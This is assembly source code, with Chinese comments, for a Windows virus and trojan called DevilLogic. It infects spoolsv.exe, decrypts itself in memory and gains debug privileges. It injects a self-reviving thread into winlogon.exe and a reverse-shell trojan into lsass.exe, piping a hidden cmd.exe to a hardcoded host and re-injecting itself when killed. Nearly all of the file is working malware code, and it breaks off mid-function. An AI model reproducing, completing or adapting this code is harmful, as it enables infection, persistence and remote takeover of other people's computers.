;DevilLogic.ASM
;感染spoolsv.exe程序
;复活线程插入到winlogon.exe进程
;木马线程插入到lsass.exe进程
include DevilLogic.INC

extrn	GetTickCount:PROC
extrn	LoadLibraryA:PROC
extrn	VirtualAlloc:PROC
extrn	GetProcAddress:PROC
extrn	ExitProcess:PROC
.586p
.model flat, stdcall
.data
DevilLogic:
	call GetEip
GetEip:
	call GetCurrentEip
GetCurrentEip:
	pop ebx
	sub ebx, offset GetCurrentEip - offset DevilLogic	;ebx为当前eip
	;获取VirtualAlloc的地址
	;开辟病毒运行内存
	push 40h
	push 3000h
	push DevilLogicSize
	push 0
	mov eax, VirtualAllocOffset	
	add eax, ebx
	call dword ptr [eax]	;执行VirtualAlloc
	;将病毒体写入运行堆
	mov ecx, DevilLogicSize
	mov edi, eax
	mov esi, ebx
	cld
	rep movsb
	;执行堆中的病毒体
	add eax, offset DeKeyCode - offset DevilLogic
	call eax		;从解码开始执行
;==================================从这里开始将不被整体执行================================		
;解码头	
DeKeyCode:
	call GetDeKeyEip
GetDeKeyEip:
	call GetDeKeyCurrentEip
GetDeKeyCurrentEip:
	pop ebx
	sub ebx, offset GetDeKeyCurrentEip - offset DeKeyCode	
	mov edx, offset KeyCode - offset DeKeyCode
	add edx, ebx			;edx中为要解密的密码
	mov dl, byte ptr [edx]
	mov esi, offset StartVirus - offset DeKeyCode
	add esi, ebx
	mov edi, esi
	mov ecx, VirusSize
	xor eax, eax
	cld
	LoopDeKeyCode:
	lodsb
	xor al, dl
	stosb
	loop LoopDeKeyCode
	;执行在堆中的病毒代码
	jmp short StartVirus				;执行病毒代码
;此中间可以添加数据
KeyCode:	;解密的密钥
	db	?
VirtualAllocLocal:
	dd	?
NormalEntry:							;正常程序的入口地址
	dd	?	
DevilLogicPRD:							;DevilLogic在宿主文件中的文件入口
	dd	?	
ImageBaseAddr:							;文件加载地址
	dd	?		
InBooter:
	db	0								;如果大于1就代表不在Booter了如果为0则代表在Booter中	
;===================
;======================	
;以下代码在堆中执行
StartVirus:
	;获取eip
	call GetVirusEip
GetVirusEip:
	call GetVirusCurrentEip
GetVirusCurrentEip:
	pop ebx
	sub ebx, offset GetVirusCurrentEip - offset StartVirus	
	;建立病毒堆栈
	push ebp
	mov ebp, esp
	sub esp, DevilLogicStackSize
	;保存病毒eip与offset
	mov dword ptr [ebp-Eip], ebx
	mov eax, offset StartVirus
	mov dword ptr [ebp-BaseOffset], eax
	;获取API
	call GetApiAddress
	;更新VirtualAlloc函数地址
	mov ebx, offset StartVirus - offset VirtualAllocLocal
	mov ecx, dword ptr [ebp-Eip]
	sub ecx, ebx
	mov eax, dword ptr [ebp-xVirtualAlloc]
	mov dword ptr [ecx], eax		;刷新VirtualAlloc地址
	;更新ExitProcess函数地址(仅为Booter使用)
	mov ebx, offset ExitProcessAddr - offset StartVirus
	mov ecx, dword ptr [ebp-Eip]
	add ecx, ebx
	mov eax, dword ptr [ebp-xExitProcess]
	mov dword ptr [ecx], eax		;刷新ExitProcess地址
	;向木马执行体中写入所需API地址
	mov ebx, dword ptr [ebp-Eip]
	mov eax, offset tLoadLibraryA - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xLoadLibraryA]
	pop dword ptr [eax] 

	mov eax, offset tCreateToolhelp32SnapShot - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xCreateToolhelp32Snapshot]
	pop dword ptr [eax] 

	mov eax, offset tCreatePipe - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xCreatePipe]
	pop dword ptr [eax] 	
	
	mov eax, offset tCreateProcessA - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xCreateProcessA]
	pop dword ptr [eax] 		

	mov eax, offset tPeekNamedPipe - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xPeekNamedPipe]
	pop dword ptr [eax] 		

	mov eax, offset tWriteFile - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xWriteFile]
	pop dword ptr [eax] 		

	mov eax, offset tReadFile - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xReadFile]
	pop dword ptr [eax] 			

	mov eax, offset tSleep - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xSleep]
	pop dword ptr [eax]		

	mov eax, offset tlstrcpyA - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xlstrcpyA]
	pop dword ptr [eax]			

	mov eax, offset tlstrcmpA - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xlstrcmpA]
	pop dword ptr [eax]			

	mov eax, offset tlstrcatA - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xlstrcatA]
	pop dword ptr [eax]			

	mov eax, offset tlstrlenA - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xlstrlenA]
	pop dword ptr [eax]																					
;ws2_32.dll		
	mov eax, offset tclosesocket - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xclosesocket]
	pop dword ptr [eax]			

	mov eax, offset tinet_addr - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xinet_addr]
	pop dword ptr [eax]			

	mov eax, offset trecv - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xrecv]
	pop dword ptr [eax]		

	mov eax, offset tsend - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xsend]
	pop dword ptr [eax]			

	mov eax, offset tconnect - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xconnect]
	pop dword ptr [eax]			

	mov eax, offset thtons - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xhtons]
	pop dword ptr [eax]			

	mov eax, offset taccept - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xaccept]
	pop dword ptr [eax]			

	mov eax, offset tlisten - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xlisten]
	pop dword ptr [eax]			

	mov eax, offset tsocket - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xsocket]
	pop dword ptr [eax]			

	mov eax, offset tWSACleanup - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xWSACleanup]
	pop dword ptr [eax]			

	mov eax, offset tWSAStartup - offset StartVirus
	add eax, ebx
	push dword ptr [ebp-xWSAStartup]
	pop dword ptr [eax]	
;============================		
	;注入复活线程并启动它
	call UpgradePopedomProcess
	call PushLsassStr
				db	'winlogon.exe',0
	PushLsassStr:
	call GetPidFromProcessName
	add esp, 04h
	push eax
	push FALSE
	push PROCESS_ALL_ACCESS
	call dword ptr [ebp-xOpenProcess]
	mov dword ptr [ebp-vRa1], eax		;保存打开句柄
	push 40h
	push 3000h
	push ReliveThreadSize
	push NULL
	push eax
	call dword ptr [ebp-xVirtualAllocEx]
	mov dword ptr [ebp-vRa2], eax		;保存复活体指针
	lea eax, [ebp-vRa4]
	push eax
	push ReliveThreadSize
	mov edx, dword ptr [ebp-Eip]
	add edx, offset ReliveThread - offset StartVirus
	push edx
	push eax
	push dword ptr [ebp-vRa1]
	call dword ptr [ebp-xWriteProcessMemory]
	;启动复活体
	lea eax, [ebp-vRa3]
	push eax
	push 0
	push NULL
	push dword ptr [ebp-vRa2]
	push 1000h
	push 0
	push dword ptr [ebp-vRa1]
	call dword ptr [ebp-xCreateRemoteThread]
;===============================
	;提升权限
	call UpgradePopedomProcess
	;获取目标的进程ID
	call PushInfectTargetNameStr
			db	'spoolsv.exe',0
	PushInfectTargetNameStr:
	call GetPidFromProcessName
	add esp, 04h		
	;去掉文件保护
	push eax					;eax为进程ID
	call RemoveSystemProtect
	add esp, 04h
	;替换系统文件
	call ReplaceSystemFile
	;感染系统文件
	;获取系统目录
	push 100h
	lea eax, [ebp-vRa1]					;临时存储系统目录指针
	push eax
	call dword ptr [ebp-xGetSystemDirectoryA]
	
	call PushTargetNameStr1
			db	'\spoolsv.exe',0
	PushTargetNameStr1:
	lea eax, [ebp-vRa1]
	push eax
	call dword ptr [ebp-xlstrcatA]
	
	lea eax, [ebp-vRa1]
	push eax
	call Infect
	;mov eax, dword ptr [ebp-OldEnterAddress]
	mov esp, ebp
	pop ebp 
	jmp eax					;跳到相应的地址
DeleteSelfAndDelete:		;删除自身并退出函数	
	call GetExitEip
GetExitEip:
	call GetExitCurrentEip
GetExitCurrentEip:	
	pop ebx
	sub ebx, offset GetExitCurrentEip- offset DeleteSelfAndDelete
	mov eax, offset ExitProcessAddr - offset DeleteSelfAndDelete
	add ebx, eax
	push 0
	call dword ptr [ebx]
;======================
ReliveThread:
	;获取eip
	call GetReliveEip
GetReliveEip:
	call GetReliveCurrentEip
GetReliveCurrentEip:
	pop ebx
	sub ebx, offset GetReliveCurrentEip - offset ReliveThread
	;建立堆栈		
	push ebp
	mov ebp, esp
	sub esp, ReliveThreadStackSize
	mov dword ptr [ebp-Eip], ebx
	;获取API
	call GetApiAddress
	;提升线程权限
	call UpgradePopedomThread
	;打开进程
	call PushLsassStr
			db	'lsass.exe',0
	PushKsassStr:
	call GetPidFromProcessName
	add esp, 04h
InsertTrojanCode:
	push eax
	push FALSE
	push PROCESS_ALL_ACCESS
	call dword ptr [ebp-xOpenProcess]
	mov dword ptr [ebp-vRa1], eax		;保存进程句柄
	push 40h
	push 3000h
	push TrojanThreadSize
	push 0
	push eax
	call dword ptr [ebp-xVirtualAllocEx]
	mov dword ptr [ebp-vRa2], eax
	lea eax, [ebp-vRa4]
	push eax
	push TrojanThreadSize
	mov edx, offset TrojanThread - offset ReliveThread
	add edx, dword ptr [ebp-Eip]
	push edx
	push eax
	push dword ptr [ebp-vRa1]
	call dword ptr [ebp-xWriteProcessMemory]
	;执行木马体
	lea eax, [ebp-vRa3]
	push eax
	push 0
	push NULL
	push dword ptr [ebp-vRa2]
	push 1000h
	push 0
	push dword ptr [ebp-vRa1]
	call dword ptr [ebp-xCreateRemoteThread]
	;保护线程
	push INFINITE	;-1
	push eax
	call dword ptr [ebp-xWaitForSingleObject]
	;如果断掉的话,重新寻找系统进程并插入
	;历遍进程表
StartReliveThreadKeeper:
	push 0
	push TH32CS_SNAPPROCESS
	call dword ptr [ebp-xCreateToolhelp32Snapshot]
	cmp eax, INVALID_HANDLE_VALUE
	jz StartReliveThreadKeeper
	mov dword ptr [ebp-RelivehProcessSnap], eax
	lea esi, [ebp-Relivepe32]
	mov eax, size PROCESSENTRY32
	mov dword ptr [esi.dwSize], eax
	push esi
	push dword ptr [ebp-RelivehProcessSnap]
	call dword ptr [ebp-xProcess32First]
	test eax, eax
	jz StartReliveThreadKeeper			;重新开始执行
CheckProcess:	
	;取出进程ID
	;lea eax, [esi.szExeFile]
	;push eax
	;call GetPidFromProcessName
	;add esp, 04h
	mov eax, dword ptr [esi.th32ProcessID]
	;取出进程用户名判断是否为系统进程
	lea ebx, [ebp-ReliveszDomain]
	push ebx
	lea ebx, [ebp-ReliveszAccount]
	push ebx
	push eax
	call GetProcessUserName
	add esp, 0Ch
	call PushSystemUserNameStr
			db	'System',0
	PushSystemUserNameStr:
	lea eax, [ebp-ReliveszAccount]
	push eax
	call dword ptr [ebp-xlstrcmpA]
	test eax, eax
	jnz GoNextProcess
	;如果是系统进程则判断进程名.当不是System,System Idle Process,explorer.exe时进行插入木马执行体
	call PushSystemProcessName
			db	'System',0
	PushSystemProcessName:
	lea eax, [esi.szExeFile]
	push eax
	call dword ptr [ebp-xlstrcmpA]
	test eax, eax
	jz GoNextProcess
	mov ebx, eax
	call PushSystemIdleProcessName
			db	'System Idle Process',0
	PushSystemIdleProcessName:
	lea eax, [esi.szExeFile]
	push eax
	call dword ptr [ebp-xlstrcmpA]
	test eax, eax
	jz GoNextProcess
	call PushHostProcessName
			db	'winlogon.exe',0
	PushHostProcessName:
	lea eax, [esi.szExeFile]
	push eax
	call dword ptr [ebp-xlstrcmpA]
	test eax, eax
	jz GoNextProcess
	;如果条件都满足则从新注入
	mov eax, dword ptr [esi.th32ProcessID]
	jmp InsertTrojanCode
GoNextProcess:	
	lea esi, [ebp-Relivepe32]
	push esi
	push dword ptr [ebp-hProcessSnap]
	call dword ptr [ebp-xProcess32Next]
	test eax, eax
	jz StartReliveThreadKeeper	;跳到最开始
	jmp CheckProcess
	mov esp, ebp
	pop ebp
	ret
;======================
TrojanThread:
	;获取eip
	call GetTrojanEip
GetTrojanEip:
	call GetTrojanCurrentEip
GetTrojanCurrentEip:
	pop ebx
	sub ebx, offset GetTrojanCurrentEip - offset TrojanThread
	mov dword ptr [ebp-TEip], ebx
	;建立堆栈		
	push ebp
	mov ebp, esp
	sub esp, TrojanThreadStackSize
StartSocket:	
	lea eax, [ebp-TWSAData]
	push eax
	push 202h
	mov eax, offset tWSAStartup - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]		;WSAStartup
	
	push IPPROTO_TCP
	push SOCK_STREAM
	push AF_INET
	mov eax, offset tsocket - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]		;socket
	cmp eax, INVALID_SOCKET
	jz StartSocket
	mov dword ptr [ebp-Ts], eax
	
	lea esi, [ebp-Taddr]
	mov ax, AF_INET
	mov word ptr [esi.sin_family], ax
	
	mov eax, offset tPort - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	push word ptr [eax]
	mov ebx, offset thtons - offset TrojanThread
	add ebx, dword ptr [ebp-TEip]
	call dword ptr [ebx]		;htons
	mov word ptr [esi.sin_port], ax
	
	mov eax, offset tIp - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	push eax
	mov ebx, offset tinet_addr - offset TrojanThread
	add ebx, dword ptr [ebp-TEip]
	call dword ptr [ebx]		;inet_addr
	mov dword ptr [esi.sin_addr.S_un.S_addr], eax

LoopConnect:	
	push 0BB8h
	mov eax, offset tSleep - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]		;Sleep
	
	push size sockaddr_in
	lea eax, [ebp-Taddr]
	push eax
	push dword ptr [ebp-Ts]
	mov ebx, offset tconnect - offset TrojanThread
	add ebx, dword ptr [ebp-TEip]
	call dword ptr [ebx]		;connect
	test eax, eax
	jz LoopConnect

TrojanCreatePipe:	
	push 0
	lea eax, [ebp-Tsa]
	push eax
	lea eax, [ebp-TWritePipe1]
	push eax
	lea eax, [ebp-TReadPipe1]
	push eax
	mov ebx, offset tCreatePipe - offset TrojanThread
	add ebx, dword ptr [ebp-TEip]
	call dword ptr [ebx]		;CreatePipe
	test eax, eax
	jz TrojanCreatePipe

	push 0
	lea eax, [ebp-Tsa]
	push eax
	lea eax, [ebp-TWritePipe2]
	push eax
	lea eax, [ebp-TReadPipe2]
	push eax
	mov ebx, offset tCreatePipe - offset TrojanThread
	add ebx, dword ptr [ebp-TEip]
	call dword ptr [ebx]		;CreatePipe
	test eax, eax
	jnz TrojanCreatePipe	
	
	lea edi, [ebp-Tsi]
	mov eax, STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES
	mov dword ptr [edi.dwFlagsSI], eax
	mov ax, SW_HIDE
	mov word ptr [edi.wShowWindow], ax
	mov eax, dword ptr [ebp-TReadPipe2]
	mov dword ptr [edi.hStdInput], eax
	mov eax, dword ptr [ebp-TWritePipe1]
	mov dword ptr [edi.hStdError], eax
	mov dword ptr [edi.hStdOutput], eax
	
TrojanCreateCmd:	
	lea eax, [ebp-Tpi]
	push eax
	lea eax, [ebp-Tsi]
	push eax
	push NULL
	push NULL
	push 0
	push 1
	push NULL
	push NULL
	call PushTrojanCmdStr
			db	'cmd.exe',0
	PushTrojanCmdStr:
	push NULL
	mov ebx, offset tCreateProcessA - offset TrojanThread
	add ebx, dword ptr [ebp-TEip]
	call dword ptr [ebx]		;CreateProcessA
	test eax, eax
	jz TrojanCreateCmd		
StartTrojanGetData:
	push 0
	push 0
	lea eax, [ebp-TlBytesRead]
	push eax
	push NetBufferSize
	lea eax, [ebp-TNetBuffer]
	push eax
	push dword ptr [ebp-TReadPipe1]
	mov ebx, offset tPeekNamedPipe - offset TrojanThread
	add ebx, dword ptr [ebp-TEip]
	call dword ptr [ebx]		;PeekNamedPipe
	mov eax, dword ptr [ebp-TlBytesRead]
	test eax, eax
	jz GetTrojanRemainData
	push 0
	lea eax, [ebp-TlBytesRead]
	push eax
	push dword ptr [ebp-TlBytesRead]
	lea eax, [ebp-TNetBuffer]
	push eax
	push dword ptr [ebp-TReadPipe1]
	mov ebx, offset tReadFile - offset TrojanThread
	add ebx, dword ptr [ebp-TEip]
	call dword ptr [ebx]	;ReadFile
	test eax, eax
	jz LoopConnect
	push 0
	push dword ptr [ebp-TlBytesRead]
	lea eax, [ebp-TNetBuffer] 
	push eax
	push dword ptr [ebp-Ts]
	mov ebx, offset tsend - offset TrojanThread
	add ebx, dword ptr [ebp-TEip]
	call dword ptr [ebx]		;send
	test eax, eax
	jz LoopConnect
GetTrojanRemainData:
	push 0
	push NetBufferSize
	lea eax, [ebp-TNetBuffer]
	push eax
	push dword ptr [ebp-Ts]
	mov ebx, offset trecv - offset TrojanThread
	add ebx, dword ptr [ebp-TEip]
	call dword ptr [ebx]		;recv
	cmp eax, 0
	jbe LoopConnect
	mov dword ptr [ebp-TlBytesRead], eax
	
	push 0
	lea eax, [ebp-TlBytesRead]
	push eax
	push dword ptr [ebp-TlBytesRead]
	lea eax, [ebp-TNetBuffer]
	push eax
	push dword ptr [ebp-TWritePipe2]
	mov ebx, offset tWriteFile - offset TrojanThread
	add ebx, dword ptr [ebp-TEip]
	call dword ptr [ebx]	;WriteFile
	test eax, eax
	jz LoopConnect
	jmp StartSocket			;断掉后重新连接	
	mov esp, ebp
	pop ebp
	ret
;所需IP与端口
tIp:
	db	 '127.0.0.1',0,0,0,0,0,0,0,0,0
tPort:
	dw	 50h		
;所需API
;kernel32.dll
tLoadLibraryA:
		dd	?
tCreateToolhelp32SnapShot:
		dd	?
tCreatePipe:
		dd	?
tCreateProcessA:
		dd	?			
tPeekNamedPipe:
		dd	?
tWriteFile:
		dd	?
tReadFile:
		dd	?
tSleep:
		dd	?
tlstrcpyA:
		dd	?
tlstrcmpA:
		dd	?
tlstrcatA:
		dd	?
tlstrlenA:
		dd	?																				
;ws2_32.dll		
tclosesocket:
		dd	?
tinet_addr:
		dd	?
trecv:
		dd	?
tsend:
		dd	?
tconnect:
		dd	?
thtons:
		dd	?
taccept:
		dd	?
tlisten:
		dd	?
tsocket:
		dd	?
tWSACleanup:
		dd	?
tWSAStartup:
		dd	?																							
EndTrojanThread:
;======================
;获取API地址
GetApiAddress:
	call GetKeyApiAddress				;ebx中为GetProcAddress的地址 esi中为kernel32.dll的地址
	mov dword ptr [ebp-vRa1], esi			;kernel32.dll的句柄
	mov dword ptr [ebp-xGetProcAddress], ebx	;GetProcAddress
	;获取LoadLibraryA的地址
	call PushLoadLibraryAStr
		db	'LoadLibraryA',0
PushLoadLibraryAStr:
	push esi
	call dword ptr [ebp-xGetProcAddress]
	mov dword ptr [ebp-xLoadLibraryA], eax

	;获取advapi32.dll句柄
	call PushAdvapi32Str
		db	'advapi32.dll',0
PushAdvapi32Str:
	call dword ptr [ebp-xLoadLibraryA]
	mov dword ptr [ebp-vRa1], eax
	mov esi, dword ptr [ebp-vRa1]	
;======================
	lea edi, [ebp-14h]		
	call PushAdvapiStr
	mov eax, ecx
	imul eax, eax, 4
	sub edi, eax
	mov dword ptr [ebp-vRa2], edi		;保存edi所指
	mov ebx, ecx
	inc ebx
LoopGetAdvapiAddress:
	call dword ptr [ebp-xGetProcAddress], esi
	cld
	stosd
	dec ebx
	mov ecx, ebx 
	loop LoopGetAdvapiAddress

	;获取ws2_32.dll句柄
	call PushWs232DllStr
		db	'ws2_32.dll',0
PushWs232DllStr:
	call dword ptr [ebp-xLoadLibraryA]
	mov dword ptr [ebp-vRa1], eax
	mov esi, dword ptr [ebp-vRa1]	
;======================
	call PushWs232Str
	mov eax, ecx
	imul eax, eax, 4
	mov edi, dword ptr [ebp-vRa2]
	sub edi, eax
	mov dword ptr [ebp-vRa2], edi
	mov ebx, ecx
	inc ebx
LoopGetWs232apiAddress:
	call dword ptr [ebp-xGetProcAddress], esi
	cld
	stosd
	dec ebx
	mov ecx, ebx 
	loop LoopGetWs232apiAddress

	;获取kernel32.dll句柄
	call PushKnl232DllStr
		db	'kernel32.dll',0
PushKnl232DllStr:
	call dword ptr [ebp-xLoadLibraryA]
	mov dword ptr [ebp-vRa1], eax
	mov esi, dword ptr [ebp-vRa1]	
;======================
	call PushKnl32Str
	mov eax, ecx
	imul eax, eax, 4
	mov edi, dword ptr [ebp-vRa2]
	sub edi, eax
	mov ebx, ecx
	inc ebx
LoopGetKernel32apiAddress:
	call dword ptr [ebp-xGetProcAddress], esi
	cld
	stosd
	dec ebx
	mov ecx, ebx 
	loop LoopGetKernel32apiAddress
	ret
	
GetKeyApiAddress:
	push ebp
	mov ebp, esp
	cld
	xor esi, esi
	assume fs:nothing
	lods dword ptr fs:[esi]
Tmp1_GetKeyApiAddress:
	inc eax
	jz Tmp2_GetKeyApiAddress
	dec eax
	xchg esi, eax
	lodsd
	jmp short Tmp1_GetKeyApiAddress
Tmp2_GetKeyApiAddress:
	lodsd
	xchg esi, eax
Tmp3_GetKeyApiAddress:
	dec esi
	xor si, si
	mov eax, [esi]
	add ax, 0A5B3h
	jnz Tmp3_GetKeyApiAddress
	mov edi, [esi.PEHeaderOffset]
	mov eax, [esi+edi]
	add eax, 0FFFFBAB0h
	jnz Tmp3_GetKeyApiAddress
	mov dword ptr [ebp-04h], esi
	;查找GetProcess函数
	GetPeExportTable:
	mov edi, esi
	add edi, [esi.PEHeaderOffset]
	mov eax, [edi.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress]	;ExportsRVA
	add eax, esi
	mov dword ptr [ebp-08h], eax		;储存ExportsRVA的线性地址
	GetExportNameList:
	mov ebx, [eax.AddressOfNames]
	add ebx, esi
	xor eax, eax
	mov edx, esi
	LoopFindApiStr:
	add ebx, 04h
	inc eax
	mov edi, [ebx]
	add edi, edx
	call PushStrGetProcAddress
			db	'GetProcAddress',0
	PushStrGetProcAddress:
	pop esi
	xor ecx, ecx
	mov cl, 0Fh
	cld
	rep cmpsb
	jnz short LoopFindApiStr
	mov esi, edx
	mov ecx, eax
	mov eax, dword ptr [ebp-08h]
	mov ebx, [eax.AddressOfFunctions]		
	add ebx, esi
	mov ebx, [ebx+ecx*4]
	add ebx, esi
	;=====================
	mov esp, ebp
	pop ebp
	ret
;======================	
PushAdvapiStr:
	pop eax
	mov ecx, esp
	call PushAdvapi1
		db	'LookupPrivilegeValueA',0
PushAdvapi1:
	call PushAdvapi2
		db	'OpenThreadToken',0 
PushAdvapi2:
	call PushAdvapi3
		db	'OpenProcessToken',0
PushAdvapi3:
	call PushAdvapi4
		db	'GetTokenInformation',0
PushAdvapi4:
	call PushAdvapi5
		db	'AdjustTokenPrivileges',0
PushAdvapi5:
	call PushAdvapi6
		db	'LookupAccountSidA',0
PushAdvapi6:
	sub ecx, esp
	shr ecx, 2
	jmp eax
;======================
PushWs232Str:
	pop eax
	mov ecx, esp
	call PushWs232api1
		db	'closesocket',0
PushWs232api1:
	call PushWs232api2
		db	'inet_addr',0
PushWs232api2:
	call PushWs232api3
		db	'recv',0
PushWs232api3:
	call PushWs232api4
		db	'send',0
PushWs232api4:
	call PushWs232api5
		db	'connect',0
PushWs232api5:
	call PushWs232api6
		db	'htons',0
PushWs232api6:
	call PushWs232api7
		db	'accept',0
PushWs232api7:
	call PushWs232api8
		db	'listen',0
PushWs232api8:
	call PushWs232api9
		db	'socket',0
PushWs232api9:
	call PushWs232api10
		db	'WSACleanup',0
PushWs232api10:
	call PushWs232api11
		db	'WSAStartup',0
PushWs232api11:
	sub ecx, esp
	shr ecx, 2
	jmp eax
;======================
PushKnl32Str:
	pop eax
	mov ecx, esp
	call PushKnlStr1
		db	'CreateFileMappingA',0
PushKnlStr1:
	call PushKnlStr2
		db	'MapViewOfFile',0
PushKnlStr2:
	call PushKnlStr3
		db	'UnmapViewOfFile',0
PushKnlStr3:
	call PushKnlStr4
		db	'CloseHandle',0
PushKnlStr4:
	call PushKnlStr5
		db	'VirtualAlloc',0
PushKnlStr5:
	call PushKnlStr6
		db	'VirtualAllocEx',0
PushKnlStr6:
	call PushKnlStr7
		db	'OpenProcess',0
PushKnlStr7:
	call PushKnlStr8
		db	'WriteProcessMemory',0
PushKnlStr8:
	call PushKnlStr9
		db	'CreateRemoteThread',0
PushKnlStr9:
	call PushKnlStr10
		db	'ExitThread',0
PushKnlStr10:
	call PushKnlStr11
		db	'CreateToolhelp32Snapshot',0
PushKnlStr11:
	call PushKnlStr12
		db	'TerminateProcess',0
PushKnlStr12:
	call PushKnlStr13
		db	'PeekNamedPipe',0
PushKnlStr13:
	call PushKnlStr14
		db	'WriteFile',0
PushKnlStr14:
	call PushKnlStr15
		db	'ReadFile',0
PushKnlStr15:
	call PushKnlStr16
		db	'Sleep',0
PushKnlStr16:
	call PushKnlStr17
		db	'CreatePipe',0
PushKnlStr17:
	call PushKnlStr18
		db	'Process32First',0
PushKnlStr18:
	call PushKnlStr19
		db	'Process32Next',0
PushKnlStr19:
	call PushKnlStr20
		db	'GetCurrentThread',0
PushKnlStr20:
	call PushKnlStr21
		db	'GetVersion',0
PushKnlStr21:
	call PushKnlStr22
		db	'WaitForSingleObject',0
PushKnlStr22:
	call PushKnlStr23
		db	'lstrcatA',0
PushKnlStr23:
	call PushKnlStr24
		db	'lstrcmpA',0
PushKnlStr24:
	call PushKnlStr25
		db	'lstrcpyA',0
PushKnlStr25:
	call PushKnlStr26
		db	'lstrlenA',0
PushKnlStr26:
	call PushKnlStr27
		db	'CopyFileA',0
PushKnlStr27:
	call PushKnlStr28
		db	'DeleteFileA',0
PushKnlStr28:
	call PushKnlStr29
		db	'VirtualFree',0
PushKnlStr29:
	call PushKnlStr30
		db	'GetSystemDirectoryA',0
PushKnlStr30:
	call PushKnlStr31
		db	'MoveFileExA',0
PushKnlStr31:
	call PushKnlStr32
		db	'SetFilePointer',0
PushKnlStr32:
	call PushKnlStr33
		db	'SetEndOfFile',0
PushKnlStr33:
	call PushKnlStr34
		db	'GetFileSize',0
PushKnlStr34:
	call PushKnlStr35
		db	'FlushFileBuffers',0
PushKnlStr35:
	call PushKnlStr36
		db	'CreateFileA',0
PushKnlStr36:
	call PushKnlStr37
		db	'GetCurrentProcess',0
PushKnlStr37:
	call PushKnlStr38
		db	'GetTickCount',0
PushKnlStr38:	
	call PushKnlStr39
		db	'CreateProcessA',0
PushKnlStr39:	
	call PushKnlStr40
		db	'FreeLibrary',0
PushKnlStr40:
	call PushKnlStr41
		db	'ExitProcess',0		
PushKnlStr41:				
	sub ecx, esp
	shr ecx, 2
	jmp eax
;======================		
EndGetApiAddress:
;======================
;提升本地线程权限
UpgradePopedomThread:
	push ebp
	mov ebp, esp
	sub esp, UpgradePopedomThreadStackSize
	mov eax, dword ptr [ebp]
	mov dword ptr [ebp-DevilLogicBaseEbp], eax
	lea eax, [ebp-hToken2]
	push eax
	push TOKEN_ADJUST_PRIVILEGES + TOKEN_QUERY
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xGetCurrentThread]
	push eax
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xOpenThreadToken]
	lea esi, [ebp-tp2]
	mov eax, 1
	mov dword ptr [esi.PrivilegeCount], eax
	push dword ptr [esi.PrivilegeCount]
	lea eax, [esi.Privileges[0].Luid]
	push eax
	call PushUUTSE_DEBUG_NAMEStr
			db	'SeDebugPrivilege',0
	PushUUTSE_DEBUG_NAMEStr:
	push 0
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xLookupPrivilegeValueA]
	mov eax, SE_PRIVILEGE_ENABLED
	mov dword ptr [esi.Privileges[0].Attributes], eax
	push 0
	push 0
	push size TOKEN_PRIVILEGES
	push esi
	push 0
	push dword ptr [ebp-hToken2]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xAdjustTokenPrivileges]
	push dword ptr [ebp-hToken2]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xCloseHandle]
	mov esp, ebp
	pop ebp
	ret	
EndUpgradePopedomThread:
;======================
;从进程名获取进程ID
GetPidFromProcessName:		;第一个参数为进程名
	push ebp
	mov ebp, esp
	sub esp, GetPidFromProcessNameStackSize
	mov eax, dword ptr [ebp]
	mov dword ptr [ebp-DevilLogicBaseEbp], eax
	mov eax, dword ptr [ebp+08h]
	mov dword ptr [ebp-szProcessName1], eax
	mov eax, INVALID_HANDLE_VALUE
	mov dword ptr [ebp-hProcessSnap], eax
	lea esi, [ebp-pe32]
	push 0
	push TH32CS_SNAPPROCESS
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xCreateToolhelp32Snapshot]
	cmp eax, INVALID_HANDLE_VALUE
	jz Error_GetPidFromProcessName
	mov dword ptr [ebp-hProcessSnap], eax
	mov dword ptr [esi.dwSize], size PROCESSENTRY32
	push esi
	push dword ptr [ebp-hProcessSnap]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xProcess32First]
	test eax, eax
	jz Error_GetPidFromProcessName
Enum_Process:
	lea eax, [esi.szExeFile]
	push eax
	push dword ptr [ebp-szProcessName1]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xlstrcmpA]
	test eax, eax
	jnz Next_Process
	mov eax, dword ptr [esi.th32ProcessID]
	jmp CloseHandle_GetPidFromProcessName
Next_Process:
	push esi
	push dword ptr [ebp-hProcessSnap]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xProcess32Next]
	test eax, eax
	jnz Enum_Process
Error_GetPidFromProcessName:
	xor eax, eax
	jmp Exit_GetPidFromProcessName	
